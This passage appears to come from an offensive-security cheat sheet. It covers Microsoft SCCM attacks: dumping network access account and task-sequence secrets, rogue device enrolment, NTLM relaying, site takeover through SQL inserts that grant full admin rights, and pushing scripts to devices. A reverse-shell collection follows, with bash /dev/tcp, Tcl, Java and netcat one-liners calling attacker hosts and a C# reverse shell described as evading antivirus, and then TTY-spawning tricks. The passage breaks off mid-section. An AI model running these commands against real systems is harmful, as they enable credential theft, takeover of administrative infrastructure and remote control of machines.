#TaskSequence variables
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence

#Device Collection variables
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
</code></pre>
<p id="bkmrk-all-this-secrets-can">All this secrets can be extracted with SharpSCCM or SharpDPAPI aswell:</p>
<pre id="bkmrk-.%2Fsharpdpapi.exe-scc"><code class="language-powershell">./SharpDPAPI.exe SCCM

#Via CIM store on disk or WMI
./SharpSCCM.exe local secrets disk
./SharpSCCM.exe local secrets wmi
</code></pre>
<p id="bkmrk-naa-can-also-be-extr"><strong>NAA</strong> can also be extracted with Mimikatz:</p>
<pre id="bkmrk-.%2Fmimikatz.exe-mimik"><code class="language-powershell">./mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # dpapi::sccm
</code></pre>
<p id="bkmrk-ultimately%2C-naa-and-">Ultimately, <strong>NAA</strong> and <strong>TaskSequence</strong> can be retrieved remotely:</p>
<pre id="bkmrk-.%2Fsharpsccm.exe-get-"><code class="language-powershell">./SharpSCCM.exe get secrets
</code></pre>
<h4 id="bkmrk-linux-0">Linux</h4>
<p id="bkmrk-sccmhunter-permits-t">Sccmhunter permits to extract everything in one command.</p>
<pre id="bkmrk-python3-sccmhunter.p"><code class="language-bash">python3 sccmhunter.py dpapi -u user1 -p password -d domain.local -dc-ip &lt;DC_IP&gt; -target &lt;target_IP&gt; -wmi

# Or with SystemDPAPIdump
SystemDPAPIdump.py -creds -sccm 'domain.local/user1:password'@'target.domain.local'
</code></pre>
<h3 id="bkmrk-sccm-secrets-policie">SCCM secrets policies</h3>
<p id="bkmrk-full-explains-about-">Full explains about these attacks are <a href="https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial#part_1">here</a>.</p>
<h4 id="bkmrk-theory">Theory</h4>
<p id="bkmrk-to-quickly-summarize">To quickly summarize, SCCM permits to new computers to self-enroll <strong>without authentication</strong> in the SCCM environment via the Management Point, and, by default, the enrolment must be approved by an administrator. However, still by default, it is possible to approve an enrolment with a domain machine account.</p>
<p id="bkmrk-this-newly-approved-">This newly approved device can request the SCCM secret policies linked the collections where it has been added (by default, <strong>All systems</strong> or <strong>All Desktop and Server clients</strong>). These policies include the NAA credentials, the Task Sequence variables, and the Collection variables. They also indicate resources to download from the Distribution Point.</p>
<p id="bkmrk-sysadmins-have-the-p">Sysadmins have the possibility to allow self-enrolment <strong>with automatic device approval</strong>. In this configuration, no machine credentials are needed since the new device will be automatically approved and able to obtain secret policies.</p>
<h4 id="bkmrk-exploitation">Exploitation</h4>
<p id="bkmrk-so%2C-an-attacker-with">So, an attacker with a valid domain machine account can enroll a new device and use it to retrieve the secret policies.</p>
<p id="bkmrk-sccmsecrets-permits-">SCCMSecrets permits to retrieve the three kinds of secrets.</p>
<pre id="bkmrk-addcomputer.py--comp"><code class="language-bash">addcomputer.py -computer-name 'EVIL$' -computer-pass 'ComputerPass123' -dc-ip &lt;DC_IP&gt; 'domain.local/user1':'password'
python3 sccmhunter.py http -u "user1" -p password -dc-ip &lt;DC_IP&gt; -cp ComputerPass123 -cn 'EVIL$'

# Or with SCCMSecrets
python3 SCCMSecrets.py policies --management-point 'managementPoint.domain.local' --client-name fake.domain.local --verbose --registration-sleep 300 --username 'machine$' --password 'password'

# With self-enrolment
python3 SCCMSecrets.py policies --management-point 'managementPoint.domain.local' --client-name fake.domain.local --verbose
</code></pre>
<p id="bkmrk-in-case-of-the-sccm-">In case of the SCCM configuration is enforced with HTTPS, the client authentication certificate of the authenticating computer must be added.</p>
<pre id="bkmrk-python3-sccmsecrets."><code class="language-bash">python3 SCCMSecrets.py policies --management-point 'https://managementPoint.domain.local' --client-name fake.domain.local --pki-cert ./cert.pem --pki-key ./key.pem --username 'machine$' --password 'password'
</code></pre>
<p id="bkmrk-exploitation-can-als">Exploitation can also be performed via a NTLM relay by relaying a device authentication:</p>
<pre id="bkmrk-ntlmrelayx.py--t-%27ht"><code class="language-bash">ntlmrelayx.py -t 'http://managementPoint.domain.local/ccm_system_windowsauth/request' -smb2support --sccm-policies -debug
</code></pre>
<h4 id="bkmrk-policies-pivoting">Policies pivoting</h4>
<p id="bkmrk-policies-are-linked-">Policies are linked to the device collections a device is member of. When a new device is compromised, it can be used to request the policies it can access and potentially find new credentials.</p>
<p id="bkmrk-to-request-sccm-poli">To request SCCM policies with an already enrolled device, its GUID (to identify it) and its private key (to sign the requests) are needed.</p>
<ul id="bkmrk-the-guid-can-be-foun"><li>The GUID can be found in different log files, like <code>C:/Windows/CCM/Logs/ClientIDManagerStartup.log</code> on the machine</li>
<li>The private key can be extracted from the LSASS memory by previously patching the CNG with Mimikatz, or by dumping it from the SYSTEM <a href="https://hideandsec.sh/active-directory-python.md#credentials-vault-and-dpapi">DPAPI</a>
</li>
</ul><p id="bkmrk-then%2C-the-requests-c">Then, the requests can be performed like this. The folder <code>CLIENT_DEVICE</code> must contain two files: <code>guid.txt</code> where the GUID is written, and <code>key.pem</code> containing the private key:</p>
<pre id="bkmrk-python3-sccmsecrets.-0"><code class="language-bash">python3 SCCMSecrets.py policies -mp 'managementPoint.domain.local' --verbose --use-existing-device CLIENT_DEVICE/
</code></pre>
<h3 id="bkmrk-sccm-content-library">SCCM content library</h3>
<p id="bkmrk-full-explains-about--0">Full explains about these attacks are <a href="https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial#part_1">here</a>.</p>
<h4 id="bkmrk-theory-0">Theory</h4>
<p id="bkmrk-this-service-hosts-t">This service hosts the ressources to provide to the SCCM clients (scripts, applications, OS, etc). Everything is hosted in a share named <code>C:\SCCMContentLib</code> and can be retrieved either via SMB in an authenticated way, or via HTTP with a specific URL, also with authentication.</p>
<p id="bkmrk-however%2C-it-appears-">However, it appears that sysadmins can configure the <strong>HTTP way to allow unauthenticated access</strong>. In this case, anonyone can download all the packages and search for sensitive data inside.</p>
<h4 id="bkmrk-exploitation-0">Exploitation</h4>
<p id="bkmrk-sccmsecrets.py-permi">SCCMSecrets.py permits to download all the packages from the Distribution Point through HTTP:</p>
<pre id="bkmrk-python3-sccmsecrets.-1"><code class="language-bash">python3 SCCMSecrets.py files --distribution-point 'distributionPoint.domain.local' --verbose --username 'user1' --password 'password'
</code></pre>
<p id="bkmrk-if-the-distribution-">If the Distribution Point allows unauthenticated requests on its HTTP service, packages can be downloaded without specifying credentials.</p>
<p id="bkmrk-or-through-a-ntlm-re">Or through a NTLM relay to the HTTP endpoint:</p>
<pre id="bkmrk-ntlmrelayx.py--t-%27ht-0"><code class="language-bash">ntlmrelayx.py -t 'http://distributionPoint.domain.local/sms_dp_smspkg$/Datalib' -smb2support --sccm-dp -debug
</code></pre>
<p id="bkmrk-cmloot.py-is-useful-">Cmloot.py is useful for SMB extraction:</p>
<pre id="bkmrk-python3-cmloot.py-do"><code class="language-bash">python3 cmloot.py domain/user1@ -findsccmservers -target-file sccmhosts.txt -cmlootdownload sccmfiles.txt
</code></pre>
<p id="bkmrk-note-that%2C-this-part">Note that, this part is independent from secret policies request: it is possible to retrieve the packages even if no device enrolment has been performed.</p>
<h2 id="bkmrk-sccm-primary-site-ta">SCCM primary site takeover</h2>
<p id="bkmrk-the-primary-site-ser">The primary site server's computer account is member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy. This means it is possible to coerce the primary site server authentication and relay it to the database server and obtain an administrative access. <a href="https://www.thehacker.recipes/ad/movement/sccm-mecm#sccm-site-takeover">Some requirements</a> must be reached to exploit this scenario. Full explains <a href="https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1">here</a> and <a href="https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf">here</a>.</p>
<h3 id="bkmrk-relay-to-the-site-da">Relay to the site database server</h3>
<h4 id="bkmrk-windows-1">Windows</h4>
<pre id="bkmrk-%23-retrieve-the-contr"><code class="language-powershell"># Retrieve the controlled user SID in HEX format
.\SharpSCCM.exe get user-sid

# Setup a NTLM relay server to MSSQL or SMB
    # targetting MS-SQL
ntlmrelayx.py -t "mssql://siteDatabase.domain.local" -smb2support -socks
    # targeting SMB
ntlmrelayx.py -t "smb://siteDatabase.domain.local" -smb2support -socks

# Coerce the primary site server authentication via Client Push Installation
.\SharpSCCM.exe invoke client-push -mp "SCCM-Server" -sc "&lt;site_code&gt;" -t "attacker.domain.local"
</code></pre>
<p id="bkmrk-with-a-mssql-socks-o">With a MSSQL socks open, an <code>mssqlclient</code> session can be obtained:</p>
<pre id="bkmrk-proxychains-mssqlcli"><code class="language-bash">proxychains mssqlclient.py "DOMAIN/SCCM-Server$"@"siteDatabase.domain.local" -windows-auth
</code></pre>
<p id="bkmrk-and-the-following-sq">And the following SQL query can be executed to grant full privileges to the controlled user on the SCCM primary site:</p>
<pre id="bkmrk---switch-to-site-dat"><code class="language-sql">--Switch to site database
use CM_&lt;site_code&gt;

--Add the SID, the name of the current user, and the site code to the RBAC_Admins table
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (&lt;SID_in_hex_format&gt;,'DOMAIN\user',0,0,'','','','','&lt;site_code&gt;');

--Retrieve the AdminID of the added user
SELECT AdminID,LogonName FROM RBAC_Admins;

--Add records to the RBAC_ExtendedPermissions table granting the AdminID the Full Administrator (SMS0001R) RoleID for the “All Objects” scope (SMS00ALL), 
--the “All Systems” scope (SMS00001), 
--and the “All Users and User Groups” scope (SMS00004)
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (&lt;AdminID&gt;,'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (&lt;AdminID&gt;,'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (&lt;AdminID&gt;,'SMS0001R','SMS00004','1');
</code></pre>
<h4 id="bkmrk-linux-1">Linux</h4>
<pre id="bkmrk-%23-print-the-stacked-"><code class="language-bash"># Print the stacked MSSQL queries for the user SID to escalate
python3 sccmhunter.py mssql -u user1 -p password -d domain.local -dc-ip &lt;DC_IP&gt; -tu user2 -sc &lt;site_code&gt; -stacked

# Run ntlmrelayx.py with the stacked query to execute
ntlmrelayx.py -t "mssql://siteDatabase.domain.local" -smb2support -q &lt;query&gt;

# Or targeting SMB
ntlmrelayx.py -t "smb://siteDatabase.domain.local" -smb2support -socks
</code></pre>
<p id="bkmrk-post-exploitation-vi">Post exploitation via SCCM can now be performed on the network.</p>
<h3 id="bkmrk-relay-to-the-sms-pro">Relay to the SMS Provider server</h3>
<p id="bkmrk-if-the-http-api-is-a">If the HTTP API is accessible on the SMS Provider server, setup <code>ntlmrelayx</code> with <a href="https://github.com/fortra/impacket/pull/1593">this PR</a> to add user1 as a new SCCM admin:</p>
<pre id="bkmrk-ntlmrelayx.py--t-htt"><code class="language-bash">ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\user1" --displayname "DOMAIN\user1" --objectsid &lt;user1_SID&gt;
</code></pre>
<p id="bkmrk-and-coerce-the-prima">And coerce the primary site server via client push, PetitPotam, PrinterBug ou whatever.</p>
<h3 id="bkmrk-relay-from-a-passive">Relay from a passive to the active site server</h3>
<p id="bkmrk-when-high-availabili">When high availability in required, it is possible to find a <a href="https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/site-server-high-availability">passive site server</a> that will be used only if the active site server stop working. Its machine account <strong>must</strong> be a member of the local Administrators group on the active site server.</p>
<p id="bkmrk-setup-a-ntlm-relay-p">Setup a NTLM relay pointing to the active server and coerce an authentication from the passive server.</p>
<pre id="bkmrk-ntlmrelayx.py--t-act"><code class="language-bash">ntlmrelayx.py -t activeServer.domain.local -smb2support -socks
</code></pre>
<p id="bkmrk-then%2C-through-the-pr">Then, through the proxy socks session, dump the SAM and LSA with <code>secretsdump.py</code>. The active site server must be a member of the SMS Provider administrators (it is member of the <code>SMS Admins</code> group), its credentials can be used to add a new controlled user to the <code>Full Admin</code> SCCM group.</p>
<pre id="bkmrk-python3-sccmhunter.p-0"><code class="language-bash">python3 sccmhunter.py admin -u activeServer$ -p :&lt;nthash&gt; -ip &lt;SMS_Provider&gt;

() (C:\) &gt;&gt; add_admin controlledUser &lt;controlledUser_SID&gt;
() (C:\) &gt;&gt; show_admins
</code></pre>
<h2 id="bkmrk-post-exploitation">Post exploitation</h2>
<h3 id="bkmrk-cmpivot-service-abus">CMPivot Service Abuse</h3>
<p id="bkmrk-the-cmpivot-service%2C">The <strong>CMPivot</strong> service, presents on the MP server, permits to enumerate all the resources (installed softwares, local administrators, hardware specification, and so on) of a computer, or a computer collection, and perform administrative tasks on them. It uses the HTTP REST API named <strong>AdminService</strong> provided by the SMS Provider server.</p>
<p id="bkmrk-with-sccm-administra">With SCCM administrative rights, it is possible to directly interact with the <strong>AdminService</strong> API, without using CMPivot, for post SCCM exploitation enumeration.</p>
<h4 id="bkmrk-windows-2">Windows</h4>
<pre id="bkmrk-%23retrieve-the-id-of-"><code class="language-powershell">#Retrieve the ID of the ressource to enumerate
.\SharpSCCM.exe get resource-id -d "COMPUTER"

#Enumerate the local administrators
.\SharpSCCM.exe invoke admin-service -r &lt;resource_ID&gt; -q "Administrators" -j

#Enumerate the installed softwares
.\SharpSCCM.exe invoke admin-service -r &lt;resource_ID&gt; -q "InstalledSoftware" -j
</code></pre>
<h4 id="bkmrk-linux-2">Linux</h4>
<pre id="bkmrk-%23-authenticate-to-th"><code class="language-bash"># Authenticate to the AdminService API
python3 sccmhunter.py admin -u user1 -p password -ip &lt;SMS_IP&gt;

# Retrieve information about a target device and interact with it
() C:\ &gt;&gt; get_device target
() (C:\) &gt;&gt; interact &lt;target_ID&gt;

# Then, enumerate resources with built-in requests
(&lt;target_ID&gt;) (C:\) &gt;&gt; ls
(&lt;target_ID&gt;) (C:\) &gt;&gt; administrators
(&lt;target_ID&gt;) (C:\) &gt;&gt; help
...
</code></pre>
<h3 id="bkmrk-applications-and-scr">Applications and scripts deployment</h3>
<h4 id="bkmrk-windows-3">Windows</h4>
<p id="bkmrk-with-sufficient-righ">With sufficient rights on the central SCCM server (rights on WMI), it is possible to deploy applications or scripts on the AD computers (SYSTEM on the server basically, to have rights on WMI) with <strong>SharpSCCM</strong> or <strong>PowerSCCM</strong>:</p>
<ul id="bkmrk-with-sharpsccm"><li>With SharpSCCM</li>
</ul><pre id="bkmrk-%23retrieve-computers-"><code class="language-powershell">#Retrieve computers linked to the SCCM server
./SharpSCCM.exe get devices -w "Active=1 and Client=1"

#Execute a binary on a target device
./SharpSCCM.exe exec -d &lt;target_device&gt; -p bin.exe

#Execute a PS command on a target device
./SharpSCCM.exe exec -d &lt;target_device&gt; -p "powershell &lt;ps_cmd&gt;"

#Coerce a NTLM authentication from a domain user
#The user is the primary user of the device
#With no user specified, the NTLM authentication will come from the logged on user
#Add --run-as-system to obtain the computer account authentication instead
./SharpSCCM.exe exec -u DOMAIN\user1 -r &lt;attacker_IP&gt;
</code></pre>
<ul id="bkmrk-with-powersccm"><li>With PowerSCCM</li>
</ul><pre id="bkmrk-%23create-sccm-session"><code class="language-powershell">#Create SCCM Session with WMI
Find-SccmSiteCode -ComputerName &lt;SCCM_computer&gt;
New-SccmSession -ComputerName &lt;SCCM_computer&gt; -SiteCode &lt;site_code&gt; -ConnectionType WMI

#Retrieve computers linked to the SCCM server
Get-SccmSession | Get-SccmComputer

#Create a computer collection
Get-SccmSession | New-SccmCollection -CollectionName "col" -CollectionType "Device"

#Add computer to the collection
Get-SccmSession | Add-SccmDeviceToCollection -ComputerNameToAdd "&lt;computer&gt;" -CollectionName "col"

#Create an app to deploy
Get-SccmSession | New-SccmApplication -ApplicationName "&lt;application_name&gt;" -PowerShellB64 "&lt;powershell_script_in_B64&gt;"

#Create an app deployment with the app and the collection previously created
Get-SccmSession | New-SccmApplicationDeployment -ApplicationName "&lt;application_name&gt;" -AssignmentName "assig" -CollectionName "col"

#Force the machine in the collection to check the app update (and force the install)
Get-SccmSession | Invoke-SCCMDeviceCheckin -CollectionName "col"
</code></pre>
<p id="bkmrk-if-application-deplo">If application deployement doesn't work, it is worth to test CMScript deployement (deploy a script instead of an app). <strong>PowerSCCM</strong> also permits to do it with this <a href="https://github.com/PowerShellMafia/PowerSCCM/pull/6">PR</a> :</p>
<pre id="bkmrk-new-cmscriptdeployem"><code class="language-powershell">New-CMScriptDeployement -CMDrive '&lt;new_drive_name&gt;' -ServerFQDN '&lt;SCCM_server_FQDN&gt;' -TargetDevice '&lt;target_FQDN&gt;' -Path '.\reverse.ps1' -ScriptName 'EvilScript'
</code></pre>
<h4 id="bkmrk-linux-3">Linux</h4>
<p id="bkmrk-with-sufficient-righ-0">With sufficient rights over the <code>AdminService</code> API it is possible to create an approval administrator and deploy scripts.</p>
<pre id="bkmrk-%23-open-a-session-ove"><code class="language-bash"># Open a session over the AdminService API
python3 sccmhunter.py admin -u user1 -p password -ip &lt;SMS_IP&gt;
# Promote as admin a controlled account
() C:\ &gt;&gt; add_admin user2 &lt;account_SID&gt;

# Reauthenticate and specify the new admin as an approval admin
python3 sccmhunter.py admin -u user1 -p password -ip &lt;SMS_IP&gt; -au user2 -ap password2
# Select a target via it's SCCM ID and deploy a PowerShell script on it
() C:\ &gt;&gt; get_device TARGET
() C:\ &gt;&gt; interact &lt;target_ID&gt;
(&lt;target_ID&gt;) (C:\) &gt;&gt; script /home/user1/add_local_admin.ps1
</code></pre>
<h2 id="bkmrk-references">References</h2>
<ul id="bkmrk-sccm-%2F-mecm---the-ha"><li>
<a href="https://www.thehacker.recipes/ad/movement/sccm-mecm">SCCM / MECM - The Hacker Recipes</a>
</li>
<li>
<a href="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/">Active Directory Spotlight: Attacking The Microsoft Configuration Manager (SCCM/MECM) - C. Sandker</a>
</li>
<li>
<a href="https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts">Push Comes To Shove: exploring the attack surface of SCCM Client Push Accounts - Trimarc</a>
</li>
<li>
<a href="https://enigma0x3.net/2016/02/">Offensive Operations with PowerSCCM - enigma0x3</a>
</li>
<li>
<a href="https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9">The Phantom Credentials of SCCM: Why the NAA Won’t Die - SpecterOps</a>
</li>
<li>
<a href="https://blog.xpnsec.com/unobfuscating-network-access-accounts/">Exploring SCCM by Unobfuscating Network Access Accounts - Adam Chester</a>
</li>
<li>
<a href="https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1">SCCM Site Takeover via Automatic Client Push Installation - SpecterOps</a>
</li>
<li>
<a href="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a">Coercing NTLM Authentication from SCCM - SpecterOps</a>
</li>
<li>
<a href="https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf">Site Takeover via SCCM’s AdminService API - SpecterOps</a>
</li>
<li>
<a href="https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087">SCCM Hierarchy Takeover - SpecterOps</a>
</li>
<li>
<a href="https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43">SCCM Hierarchy Takeover with High Availability - SpecterOps</a>
</li>
<li>
<a href="https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial">SCCMSecrets.py: exploiting SCCM policies distribution for credentials harvesting, initial access and lateral movement - Synacktiv</a>
</li>
</ul>
                            
        
            <div class="page-break"></div>
        <h1 id="page-73">Reverse shells</h1>

                    <h3 id="bkmrk-listener">Listener</h3>
<p id="bkmrk-avant-tout-reverse-s">Before any reverse shell, you need to set up the listener, which will listen to a port and receive connections :</p>
<pre id="bkmrk-nc--lvvp-%3Cport%3E"><code class="language-shell">nc -lvvp &lt;PORT&gt;</code></pre>
<hr id="bkmrk-"><h3 id="bkmrk-bash">Bash</h3>
<p id="bkmrk-en-udp-%3A">In TCP :</p>
<pre id="bkmrk-bash--i-%3E%26-%2Fdev%2Ftcp%2F"><code class="language-shell">bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
<p>exec 5&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</p>
<p>exec /bin/sh 0&lt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 1&gt;&amp;0 2&gt;&amp;0</p>
<p>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</p></code></pre>
<p id="bkmrk-%C2%A0"> </p>
<h3 id="bkmrk-tclsh">TCLsh</h3>
<pre id="bkmrk-%23%21%2Fusr%2Fbin%2Ftclsh-set"><code class="language-shell">#!/usr/bin/tclsh
set s [socket &lt;IP&gt; &lt;PORT&gt;];
while {42} {
puts -nonewline $s "shell&gt;";
flush $s;
gets $s c;
set e "exec $c";
if {![catch {set r [eval $e]} err]} {
puts $s $r;
}
flush $s;
}
close $s;</code></pre>
<p id="bkmrk-version-one-liner-%3A">One-liner version :</p>
<pre id="bkmrk-echo-%27set-s-%5Bsocket-"><code class="language-shell">echo 'set s [socket &lt;IP&gt; &lt;PORT&gt;];while 42 { puts -nonewline $s "shell&gt;";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh</code></pre>
<p id="bkmrk-%C2%A0-0"> </p>
<p id="bkmrk-%C2%A0-1"> </p>
<h3 id="bkmrk-java">Java</h3>
<pre id="bkmrk-r-%3D-runtime.getrunti"><code class="language-java">r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt; &gt;/dev/tcp/&lt;IP&gt;/&lt;PORT&gt;;cat &lt;&amp; 5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</code></pre>
<p id="bkmrk-%C2%A0-2"> </p>
<h3 id="bkmrk-on-pwn%27d-client">On PWN'd Client</h3>
<pre id="bkmrk-mkfifo-%2Ftmp%2Fs%3B-%2Fbin%2F"><code class="language-bash">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s</code></pre>
<p id="bkmrk-%C2%A0-3"> </p>
<h3 id="bkmrk-c%23">C#</h3>
<p id="bkmrk-%C2%A0-4">This is a simple C# source code to bypass almost "all" AVs (kaspersky v19, Eset v12 v13, Trend-Micro v16, Comodo and Windows Defender bypassed via this very simple method)</p>
<pre id="bkmrk-step-1-%28linux-side%3A1"><code class="language-">Step 1 (Linux Side:192.168.56.1)   : nc -l -p 443 
<p>Step 2 (Windows Side:192.168.56.x) : NativePayload_ReverseShell.exe 192.168.56.1 443 </p></code></pre>
<pre id="bkmrk-using-system%3B-using-"><code class="language-C#">using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace NativePayload_ReverseShell
{
    class Program
    {
        public static StringBuilder _Liger = new StringBuilder();
        private static StreamWriter _LionTiger;
        static void Main(string[] args)
        {
	    //// Step 1 (linux Side:192.168.56.1)   : nc -l -p 443 
	    //// Step 2 (Windows Side:192.168.56.x) : NativePayload_ReverseShell.exe 192.168.56.1 443 

 	    Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_ReverseShell , Published by Damon Mohammadbagher , 2018");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_ReverseShell , C# Managed Shell Code (Reverse Shell)");
            Console.WriteLine();

            try
            {
                using (TcpClient Simple = new TcpClient(args[0].ToString(), Convert.ToInt32(args[1])))
                {
                    Thread.Sleep(1100);
                    using (Stream Very = Simple.GetStream())
                    {
                        using (StreamReader OoPS = new StreamReader(Very))
                        {
                            _LionTiger = new StreamWriter(Very);
                            Process _Tiger = new Process();
                            Thread.Sleep(3300);
                            _Tiger.StartInfo.FileName = Convert.ToString("0123456789CmD" + "." + "e" + "XE l;X E f k X  E sgkf;sk X  E f s ; xefs;s").Substring(10, 8);
                            _Tiger.StartInfo.CreateNoWindow = true;
                            _Tiger.StartInfo.UseShellExecute = false;
                            _Tiger.OutputDataReceived += _OutputDataReceived;
                            _Tiger.StartInfo.RedirectStandardOutput = true;
                            _Tiger.StartInfo.RedirectStandardInput = true;
                            _Tiger.StartInfo.RedirectStandardError = true;
                            _Tiger.Start();
                            _Tiger.BeginOutputReadLine();
                            while (true)
                            {
                                Thread.Sleep(3000);
                                _Liger.Append(OoPS.ReadLine());
                                _Tiger.StandardInput.WriteLine(_Liger);
                                _Liger.Remove(0, _Liger.Length);
                            }
                        }
                    }

                }
            }
            catch (Exception) {  }
        }

        private static void _OutputDataReceived(object sender, DataReceivedEventArgs echo)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(echo.Data))
            {
                try
                {
                    strOutput.Append(echo.Data);
                    _LionTiger.WriteLine(strOutput);
                    _LionTiger.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}</code></pre>
<p id="bkmrk-%C2%A0-7"> </p>
<h2 id="bkmrk-reverse-powershell" class="ho hp ap by bx hq hr hs ht hu hv hw hx hy hz ia ib" data-selectable-paragraph="">Reverse Powershell</h2>
<pre id="bkmrk-%2332bit-nc.exe-%24attac"><code class="language-">#32bit
nc.exe $ATTACKER_HOST $ATTACKER_PORT -e powershell
<p>#64bit
nc64.exe $ATTACKER_HOST $ATTACKER_PORT -e powershell</p></code></pre>
<h2 id="bkmrk-reverse-windows" class="ho hp ap by bx hq hr hs ht hu hv hw hx hy hz ia ib" data-selectable-paragraph="">Reverse Windows</h2>
<pre id="bkmrk-%2332bit-nc.exe-%24attac-0"><code class="language-">#32bit
nc.exe $ATTACKER_HOST $ATTACKER_PORT -e cmd
#64bit
nc64.exe $ATTACKER_HOST $ATTACKER_PORT -e cmd</code></pre>
<h2 id="bkmrk-bind-powershell" class="ho hp ap by bx hq hr hs ht hu hv hw hx hy hz ia ib" data-selectable-paragraph="">Bind Powershell</h2>
<pre id="bkmrk-%2332bit-nc.exe--l--p-"><code class="language-windows">#32bit
nc.exe -l -p $LISTENPORT -e powershell
#64bit
nc64.exe -l -p $LISTENPORT -e powershell</code></pre>
<p id="bkmrk-%C2%A0-5"> </p>

        
            <div class="page-break"></div>
        <h1 id="page-74">Spawning TTY Shells</h1>

                    <h3 id="bkmrk-shell-spawning">Shell Spawning</h3>
<h4 id="bkmrk-python">Python</h4>
<pre id="bkmrk-python--c-%27import-pt"><code class="language-">python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'</code></pre>
<h4 id="bkmrk-bash"><strong>Bash</strong></h4>
<pre id="bkmrk-echo-os.system%28%27%2Fbin"><code class="language-">echo os.system('/bin/bash')
/bin/sh -i</code></pre>
<h4 id="bkmrk-perl"><strong>Perl</strong></h4>
<pre id="bkmrk-perl-%E2%80%94e-%27exec-%22%2Fbin%2F"><code class="language-">perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";</code></pre>
<h4 id="bkmrk-ruby"><strong>Ruby</strong></h4>
<pre id="bkmrk-ruby%3A-exec-%22%2Fbin%2Fsh%22"><code class="language-">ruby: exec "/bin/sh"</code></pre>
<h4 id="bkmrk-lua"><strong>LUA</strong></h4>
<pre id="bkmrk-lua%3A-os.execute%28%27%2Fbi"><code class="language-">lua: os.execute('/bin/sh')</code></pre>
<h4 id="bkmrk-from-within-irb"><strong>From Within IRB</strong></h4>
<pre id="bkmrk-exec-%22%2Fbin%2Fsh%22"><code class="language-">exec "/bin/sh"</code></pre>
<h4 id="bkmrk-inside-vi"><strong>Inside vi</strong></h4>
<pre id="bkmrk-%3A%21bash-%3Aset-shell%3D%2Fb"><code class="language-">:!bash
:set shell=/bin/bash:shell</code></pre>
<h4 id="bkmrk-nmap-%3C%3D5.21"><strong>Nmap &lt;=5.21</strong></h4>
<pre id="bkmrk-nmap--v-nmap---inter"><code class="language-">nmap -V
nmap --interactive
!sh</code></pre>
<h4 id="bkmrk-socat"><strong>Socat </strong></h4>
<p id="bkmrk-%23-listener"><strong># Listener</strong></p>
<pre id="bkmrk-socat-file%3A%60tty%60%2Craw"><code class="language-">socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre>
<p id="bkmrk-%23-victim"># Victim</p>
<pre id="bkmrk-socat-exec%3A%27bash--li"><code class="language-">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</code></pre>
<h4 id="bkmrk-%C2%A0"> </h4>
<h3 id="bkmrk-stty-options"><strong>STTY Options </strong></h3>
<h4 id="bkmrk-in-reverse-shell"><strong>In Reverse Shell</strong></h4>
<pre id="bkmrk-%24-python--c-%27import-"><code class="language-">$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z</code></pre>
<h4 id="bkmrk-in-kali"><strong>In Kali </strong></h4>
